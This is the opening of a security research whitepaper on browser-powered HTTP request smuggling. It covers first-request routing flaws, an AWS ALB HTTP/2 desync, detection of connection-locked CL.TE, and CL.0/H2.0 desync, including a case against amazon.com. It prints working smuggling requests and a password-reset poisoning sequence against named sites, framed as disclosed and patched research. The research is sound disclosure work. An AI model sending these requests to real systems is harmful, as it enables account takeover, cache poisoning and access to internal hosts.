Browser-Powered Desync Attacks: A New Frontier in
HTTP Request Smuggling
James Kettle - PI:EMAIL - @albinowax
The recent rise of HTTP Request Smuggling has seen a ﬂood of critical ﬁndings enabling near-complete compromise of
numerous major websites. However, the threat has been conﬁned to attacker-accessible systems with a reverse proxy
front-end... until now.
In this paper, I'll show you how to turn your victim's web browser into a desync delivery platform, shifting the request
smuggling frontier by exposing single-server websites and internal networks. You'll learn how to combine cross-domain
requests with server ﬂaws to poison browser connection pools, install backdoors, and release desync worms. With these
techniques I'll compromise targets including Apache, Akamai, Varnish, Amazon, and multiple web VPNs.
This new frontier offers both new opportunities and new challenges. While some classic desync gadgets can be adapted,
other scenarios force extreme innovation. To help, I'll share a battle-tested methodology combining browser features and
custom open-source tooling. We'll also release free online labs to help hone your new skillset.
I'll also share the research journey, uncovering a strategy for black-box analysis that solved a long-standing desync
obstacle and unveiled an extremely effective novel desync trigger. The resulting fallout will encompass client-side,
server-side, and even MITM attacks. To wrap up, I'll demo mangling HTTPS to trigger an MITM-powered desync on
Apache.
Outline
This paper covers four key topics.
HTTP handling anomalies covers the sequence of novel vulnerabilities and attack techniques that led to the core
discovery of browser-powered desync attacks, plus severe ﬂaws in amazon.com and AWS Application Load Balancer.
Client-side desync introduces a new class of desync that poisons browser connection pools, with vulnerable systems
ranging from major CDNs down to web VPNs.
Pause-based desync introduces a new desync technique affecting Apache and Varnish, which can be used to trigger both
server-side and client-side desync exploits.
Conclusion offers practical advice for mitigating these threats, and potential variations which haven't yet been
discovered.
In this paper I'll use the term "browser-powered desync attack" as a catch-all term referring to all desync attacks that can
be triggered via a web browser. This encompasses all client-side desync attacks, plus some server-side ones.
As case studies, I'll target quite a few real websites. All vulnerabilities referenced in this paper have been reported to the
relevant vendors, and patched unless otherwise mentioned. All bug bounties earned during our research are donated to
charity1.
This research is built on concepts introduced in HTTP Desync Attacks2 and HTTP/2: The Sequel is Always Worse3 - you
may ﬁnd it's worth referring back to those whitepapers if anything doesn't make sense. We've also covered the core,
must-read aspects of this topic in our Web Security Academy.
Practical application
This paper introduces a lot of techniques, and I'm keen to make sure they work for you. As part of that,
My team has built live replicas of key vulnerabilities4, so you can practise online for free
I've released the full source-code behind the discovery and exploitation of every case-study, as updates to HTTP
Request Smuggler5 and Turbo Intruder6.
Finally, please note that the live version of this whitepaper at https://portswigger.net/research/browser-powered-desync-
attacks7 contains videos of key attacks, and will be updated with a recording of the presentation.
Enjoy!
Table of contents
HTTP handling anomalies
Connection state attacks
The surprise factor
Detecting connection-locked CL.TE
Browser-compatible CL.0
H2.0 on amazon.com
Client-side desync
Methodology
Akamai stacked-HEAD
Cisco VPN client-side cache poisoning
Verisign fragmented chunk
Pulse Secure VPN
Pause-based desync
Server-side
MITM-powered
Conclusion
Further research
Defence
Summary
HTTP handling anomalies
Research discoveries often appear to come out of nowhere. In this section, I'll describe four separate vulnerabilities that
led to the discovery of browser-powered desync attacks. This should provide useful context, and the techniques are also
quite powerful in their own right.
Connection state attacks
Abstractions are an essential tool for making modern systems comprehensible, but they can also mask critical details.
If you're not attempting a request smuggling attack, it's easy to forget about HTTP connection-reuse and think of HTTP
requests as standalone entities. After all, HTTP is supposed to be stateless. However, the layer below (typically TLS) is
just a stream of bytes and it's all too easy to ﬁnd poorly implemented HTTP servers that assume multiple requests sent
over a single connection must share certain properties.
The primary mistake I've seen in the wild is servers assuming that every HTTP/1.1 request sent down a given TLS
connection must have the same intended destination and HTTP Host header. Since web browsers comply with this
assumption, everything will work ﬁne until a hacker turns up.
I've encountered two distinct scenarios where this mistake has signiﬁcant security consequences.
First-request validation
Reverse proxies often use the Host header to identify which back-end server to route each request to, and have a whitelist
of hosts that people are allowed to access:
GET / HTTP/1.1 
Host: www.example.com
HTTP/1.1 200 OK 
GET / HTTP/1.1 
Host: intranet.example.com
-connection reset- 
However, I discovered that some proxies only apply this whitelist to the ﬁrst request sent over a given connection. This
means attackers can gain access to internal websites by issuing a request to an allowed destination, followed by one for
the internal site down the same connection:
GET / HTTP/1.1 
Host: www.example.com 
GET / HTTP/1.1 
Host: intranet.example.com 
HTTP/1.1 200 OK 
... 
HTTP/1.1 200 OK 
Internal website  
Mercifully, this mistake is quite rare.
First-request routing
First-request routing is a closely related ﬂaw, which occurs when the front-end uses the ﬁrst request's Host header to
decide which back-end to route the request to, and then routes all subsequent requests from the same client connection
down the same back-end connection.
This is not a vulnerability itself, but it enables an attacker to hit any back-end with an arbitrary Host header, so it can be
chained with Host header attacks8 like password reset poisoning, web cache poisoning, and gaining access to other
virtual hosts.
In this example, we'd like to hit the back-end of example.com with a poisoned host-header of 'psres.net' for a password
reset poisoning attack, but the front-end won't route our request:
POST /pwreset HTTP/1.1 
Host: psres.net 
HTTP/1.1 421 Misdirected Request 
... 
Yet by starting our request sequence with a valid request to the target site, we can successfully hit the back-end:
GET / HTTP/1.1 
Host: example.com 
POST /pwreset HTTP/1.1 
Host: psres.net 
HTTP/1.1 200 OK 
... 
HTTP/1.1 302 Found 
Location: /login 
Hopefully triggering an email to our victim with a poisoned reset link:
Click here to reset your password: https://psres.net/reset?k=secret
You can scan for these two ﬂaws using the 'connection-state probe' option in HTTP Request Smuggler.
The surprise factor
Most HTTP Request Smuggling attacks can be described as follows:
Send an HTTP request with an ambiguous length to make the front-end server disagree with the back-end about where
the message ends, in order to apply a malicious preﬁx to the next request. The ambiguity is usually achieved through an
obfuscated Transfer-Encoding header.
Late last year I stumbled upon a vulnerability that challenged this deﬁnition and a number of underlying assumptions.
The vulnerability was triggered by the following HTTP/2 request, which doesn't use any obfuscation or violate any
RFCs. There isn't even any ambiguity about the length, as HTTP/2 has a built-in length ﬁeld in the frame layer:
:method POST
:path /
:authority redacted
X
This request triggered an extremely suspicious intermittent 400 Bad Request response from various websites that were
running AWS Application Load Balancer (ALB) as their front-end. Investigation revealed that ALB was mysteriously
adding a 'Transfer-Encoding: chunked' header before forwarding the request to the back-end, without making any
alterations to the message body:
POST / HTTP/1.1 
Host: redacted 
Transfer-Encoding: chunked 
X
Exploitation was trivial - I just needed to provide a valid chunked body:
:method POST
:path /
:authority redacted
0 
malicious-prefix
POST / HTTP/1.1 
Host: redacted 
Transfer-Encoding: chunked 
0 
malicious-prefix 
This is a perfect example of ﬁnding a vulnerability that leaves you retrospectively trying to understand what actually
happened and why. There's only one thing that's unusual about the request - it has no Content-Length (CL) header.
Omitting the CL is explicitly acceptable in HTTP/2 due to the aforementioned built-in length ﬁeld. However, browsers
always send a CL so the server apparently wasn't expecting a request without one.
I reported this to AWS, who ﬁxed it within ﬁve days. This exposed a number of websites using ALB to request
smuggling attacks, but the real value was the lesson it taught. You don't need header obfuscation or ambiguity for request
smuggling; all you need is a server taken by surprise.
Detecting connection-locked CL.TE
With these two lessons in the back of my mind, I decided to tackle an open problem highlighted by my HTTP/2 research
last year - generic detection of connection-locked9 HTTP/1.1 request smuggling vulnerabilities. Connection-locking
refers to a common behaviour whereby the front-end creates a fresh connection to the back-end for each connection
established with the client. This makes direct cross-user attacks mostly impossible, but still leaves open other avenues of
attack.
To identify this vulnerability, you need to send the "attacker" and "victim" requests over a single connection, but this
creates huge numbers of false positives since the server behaviour can't be distinguished from a common, harmless
feature called HTTP pipelining10. For example, given the following request/response sequence for a CL.TE attack, you
can't tell if the target is vulnerable or not:
POST / HTTP/1.1 
Host: example.com 
Content-Length: 41 
Transfer-Encoding: chunked 
0 
GET /hopefully404 HTTP/1.1 
Foo: barGET / HTTP/1.1 
Host: example.com 
HTTP/1.1 301 Moved Permanently 
Location: /en 
HTTP/1.1 404 Not Found 
Content-Length: 162...
You can test this for yourself in Turbo Intruder by increasing the requestsPerConnection setting from 1 - just be prepared
for false positives.
I wasted a lot of time trying to tweak the requests to resolve this problem. Eventually I decided to formulate exactly why
the response above doesn't prove a vulnerability is present, and a solution became apparent immediately:
From the response sequence above, you can tell that the back-end is parsing the request using the Transfer-Encoding
header thanks to the subsequent 404 response. However, you can't tell whether the front-end is using the request's
Content-Length and therefore vulnerable, or securely treating it as chunked and assuming the orange data has been
pipelined.
To rule out the pipelining possibility and prove the target is really vulnerable, you just need to pause and attempt an early
read after completing the chunked request with 0\r\n\r\n. If the server responds during your read attempt, that shows the
front-end thinks the message is complete and therefore must have securely interpreted it as chunked:
POST / HTTP/1.1 
Host: example.com 
Content-Length: 41 
Transfer-Encoding: chunked 
0 
HTTP/1.1 301 Moved Permanently 
Location: /en
If your read attempt hangs, this shows that the front-end is waiting for the message to ﬁnish and, therefore, must be using
the Content-Length, making it vulnerable:
POST / HTTP/1.1 
Host: example.com 
Content-Length: 41 
Transfer-Encoding: chunked 
0 
-connection timeout-
This technique can easily be adapted for TE.CL vulnerabilities too. Integrating it into HTTP Request Smuggler quickly
revealed a website running IIS behind Barracuda WAF that was vulnerable to Transfer-Encoding : chunked. Interestingly,
it turned out that an update which ﬁxes this vulnerability was already available, but it was implemented as a speculative
hardening measure11 so it wasn't ﬂagged as a security release and the target didn't install it.
CL.0 browser-compatible desync
The early-read technique ﬂagged another website with what initially looked like a connection-locked TE.CL
vulnerability. However, the server didn't respond as expected to my manual probes and reads. When I attempted to
simplify the request, I discovered that the Transfer-Encoding header was actually completely ignored by both front-end
and back-end. This meant that I could strip it entirely, leaving a confusingly simple attack:
POST / HTTP/1.1 
Host: redacted 
Content-Length: 3 
xyzGET / HTTP/1.1 
Host: redacted 
HTTP/1.1 200 OK 
Location: /en 
HTTP/1.1 405 Method Not Allowed
The front-end was using the Content-Length, but the back-end was evidently ignoring it entirely. As a result, the back-
end treated the body as the start of the second request's method. Ignoring the CL is equivalent to treating it as having a
value of 0, so this is a CL.0 desync - a known12 but lesser-explored attack class.
TE.CL and CL.TE // classic request smuggling 
H2.CL and H2.TE // HTTP/2 downgrade smuggling 
CL.0 // this 
H2.0 // implied by CL.0 
0.CL and 0.TE // unexploitable without pipelining
The second and even more important thing to note about this vulnerability is that it was being triggered by a completely
valid, speciﬁcation-compliant HTTP request. This meant the front-end has zero chance of protecting against it, and it
could even be triggered by a browser.
The attack was possible because the back-end server simply wasn't expecting a POST request. It left me wondering,
given that I'd discovered it by accident, how many sites would turn up if I went deliberately looking?
H2.0 on amazon.com
Implementing a crude scan check for CL.0/H2.0 desync vulnerabilities revealed that they affect numerous sites including
amazon.com, which ignored the CL on requests sent to /b/:
POST /b/ HTTP/2 
Host: www.amazon.com 
Content-Length: 23 
GET /404 HTTP/1.1 
X: XGET / HTTP/1.1 
Host: www.amazon.com 
HTTP/2 200 OK 
Content-Type: text/html 
HTTP/2 200 OK 
Content-Type: image/x-icon